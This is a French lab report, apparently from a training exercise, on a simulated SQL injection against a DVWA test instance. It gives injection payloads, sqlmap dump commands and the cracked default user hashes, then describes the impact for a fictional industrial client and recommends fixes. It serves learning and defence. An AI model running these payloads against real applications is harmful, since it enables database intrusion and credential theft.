================================================================================
SIMULATION 3 : SQL INJECTION
Date : 28/03/2026
Cible : http://10.10.10.20/dvwa/
Niveau de sécurité : low
================================================================================

1. INJECTION MANUELLE :

Requête : 1' OR '1'='1
Résultat : Extraction de tous les utilisateurs

Requête : 1' UNION SELECT user,password FROM users #
Résultat : Extraction des identifiants hachés

2. IDENTIFIANTS EXTRAITS :

| Utilisateur | Mot de passe (hash) | Mot de passe (clair) |
|-------------|---------------------|---------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

3. SQLmap AUTOMATISÉ :

Commandes utilisées :
- sqlmap --dbs : Identification des bases
- sqlmap --tables : Identification des tables
- sqlmap --dump : Extraction des données

Bases de données trouvées : dvwa, information_schema, mysql, performance_schema
Tables dans dvwa : guestbook, users

================================================================================
IMPACT POUR TECHNOSITE INDUSTRIE :
================================================================================

1. Un attaquant peut extraire tous les identifiants de l'application
2. Accès possible au panneau d'administration
3. Mouvement latéral possible vers d'autres systèmes
4. Si l'application web de maintenance a une faille SQL, l'attaquant peut :
   - Accéder aux données de production
   - Modifier des paramètres
   - Utiliser l'application comme point d'entrée vers OT

================================================================================
RECOMMANDATIONS :
================================================================================
1. Utiliser des requêtes paramétrées (prepared statements)
2. Mettre en place un WAF (Web Application Firewall)
3. Limiter les privilèges de la base de données
4. Chiffrer les mots de passe avec un algorithme fort (bcrypt)
5. Effectuer des tests d'intrusion réguliers
